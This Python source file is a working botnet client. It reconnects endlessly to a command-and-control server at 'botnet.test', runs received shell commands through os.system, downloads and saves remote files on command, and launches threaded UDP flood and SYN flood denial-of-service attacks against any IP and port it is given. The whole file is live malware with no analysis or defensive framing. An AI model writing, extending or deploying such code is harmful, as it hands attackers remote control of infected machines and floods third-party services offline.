import os
import time
import socket
import random
import requests
import threading

SERVER_DOMAIN = "botnet.test"
SERVER_URL = "http://"+SERVER_DOMAIN
FMT = "utf-8"

# Basic ddos attacks
def ddos(attack_type, attack_ipaddress, attack_port, attack_time):
    if attack_type == "UDP" or attack_type == "udp":
        seconds = time.time() + attack_time
        bytes = random._urandom(1490)
        attack_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < seconds:
            try:
                attack_sock.sendto(bytes, (attack_ipaddress, attack_port))
            except:
                pass

    if attack_type == "SYN" or attack_type == "syn":
        seconds = time.time() + attack_time
        while time.time() < seconds:
            attack_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            attack_sock.setblocking(0)
            try:
                attack_sock.connect((attack_ipaddress, attack_port))
            except:
                pass

# Handle cnc commands
def order_handler(order):
    if order == ".ping":
        bot.send(".ping_received".encode(FMT))
    
    else:
        order = order.split("%")
        
        if order[0] == ".exec":
            os.system(order[1])

        elif order[0] == ".download":
            file_content = requests.get(order[1]).content
            with open(order[2], "wb") as f:
                f.write(file_content)

        elif order[0] == ".ddos":
            for i in range(int(order[4])):
                threading.Thread(target=ddos, args=(order[1], order[2], int(order[3]), int(order[5]))).start()

def main():
    while True:
        try:
            cncport = int(requests.get(SERVER_URL+"/getcncport").text)
            cncaddr = socket.gethostbyname(SERVER_DOMAIN)

            global bot
            bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bot.connect((cncaddr, cncport))

            check_online = 0
            check_online2 = 0

            while True:
                received_order = bot.recv(1024).decode(FMT)
                if received_order == "":
                    bot.close()
                    int("a") # Purposely generating exception because connection with server got lost
                threading.Thread(target=order_handler, args=(received_order,)).start()
                

        except: # If something in the proccess of connecting to server has failed, bot will try to connect unlimited times
            pass
        
        time.sleep(5)

if __name__ == "__main__":
    main()